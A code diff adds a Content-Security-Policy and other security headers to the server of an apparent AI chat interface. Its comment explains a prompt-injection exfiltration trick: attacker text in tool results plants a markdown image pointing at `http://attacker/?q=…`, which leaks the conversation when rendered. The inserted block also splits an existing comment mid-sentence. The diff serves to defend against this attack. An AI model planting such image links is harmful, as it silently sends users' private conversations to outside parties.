@@ -395,6 +395,57 @@ export function createServer(opts: ServerOptions) {
   // executor callback) are exempt from the server bearer check — they do
   // their own auth. Compiled from the route registry into method + path
   // matchers; `:param` segments become wildcards. Checked against the
+  /**
+   * Security headers on every response.
+   *
+   * The Content-Security-Policy is the load-bearing one, and `img-src` is the
+   * reason it exists. The UI renders model output and tool results as markdown,
+   * and a tool result carries whatever a fetched page, an inbound email or a
+   * third-party API said — so an attacker who can influence any of those can
+   * write `![](http://attacker/?q=…)` into the transcript. Rendering that image
+   * is a silent outbound request that leaks the surrounding conversation, and
+   * it needs no JavaScript at all, so no amount of script-blocking touches it.
+   * Restricting images to this origin and `data:` closes the channel while
+   * still showing everything TAI serves from its own media store.
+   *
+   * `'unsafe-inline'` stays on `style-src` because the bundled UI ships inline
+   * styles; it is deliberately absent from `script-src`, which is what stops an
+   * injected `onerror=` handler from running even if one survived the
+   * sanitizer.
+   *
+   * Overridable through `server.csp`, since a deployment that fronts TAI with
+   * its own CDN or embeds it in another app has legitimate reasons to differ.
+   * Set it to `false` to send nothing.
+   */
+  const cspSetting = runtime.getConfig().server?.csp;
+  if (cspSetting !== false) {
+    const policy =
+      typeof cspSetting === "string"
+        ? cspSetting
+        : [
+            "default-src 'self'",
+            "img-src 'self' data: blob:",
+            "media-src 'self' data: blob:",
+            "script-src 'self'",
+            "style-src 'self' 'unsafe-inline'",
+            "font-src 'self' data:",
+            "connect-src 'self'",
+            // Nothing here should ever frame another origin, or be framed.
+            "frame-src 'none'",
+            "frame-ancestors 'none'",
+            "object-src 'none'",
+            "base-uri 'self'",
+            "form-action 'self'",
+          ].join("; ");
+    app.use("*", async (c, next) => {
+      await next();
+      c.header("Content-Security-Policy", policy);
+      c.header("X-Content-Type-Options", "nosniff");
+      c.header("Referrer-Policy", "no-referrer");
+      c.header("X-Frame-Options", "DENY");
+    });
+  }
+
   // concrete request path (`c.req.routePath` is the middleware's own `/api/*`
   // pattern inside `app.use`, so it can't identify the matched handler).
   const authExemptMatchers = runtime
